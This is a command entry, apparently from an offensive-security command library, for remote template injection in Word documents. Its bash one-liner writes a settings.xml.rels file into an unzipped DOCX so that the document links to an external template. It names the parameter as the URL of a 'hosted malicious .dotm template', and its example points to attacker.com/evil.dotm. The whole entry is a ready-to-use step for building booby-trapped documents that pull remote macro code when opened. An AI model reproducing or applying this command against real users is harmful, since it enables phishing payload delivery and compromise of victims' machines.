---
id: c118f100-89a0-4b23-aaba-1f43e67234d9
name: generate-external-template-rels-xml
type: command
executor: bash
data: >-
  echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships
  xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship
  Id="rId1"
  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
  Target="$_MALICIOUS_URL" TargetMode="External"/></Relationships>' >
  word/_rels/settings.xml.rels
output: null
created_at: '2023-04-06T03:56:23.897382+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
  - macOS
tags:
  - docx
  - xml
  - template-injection
verified: true
validated: true
---

# generate-external-template-rels-xml

## Command

```bash
echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="$_MALICIOUS_URL" TargetMode="External"/></Relationships>' > word/_rels/settings.xml.rels
```

## Description

This command generates the settings.xml.rels file within an extracted DOCX directory, defining an external relationship to a remote malicious template. Run this after unzipping a DOCX in the extracted directory to inject the template link.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_MALICIOUS_URL | URL to the hosted malicious .dotm template file | Yes |

## Examples

### Basic Usage

```bash
echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://attacker.com/evil.dotm" TargetMode="External"/></Relationships>' > word/_rels/settings.xml.rels
```

### Advanced Usage

If appending to existing rels, use sed or manual edit instead, but this overwrites for simplicity.

## Expected Output

No stdout output if successful; the file word/_rels/settings.xml.rels is created. Verify with: cat word/_rels/settings.xml.rels (should show the XML with Target).

## Related

- [[procedures/Create-DOCX-with-Remote-Template-Injection]]
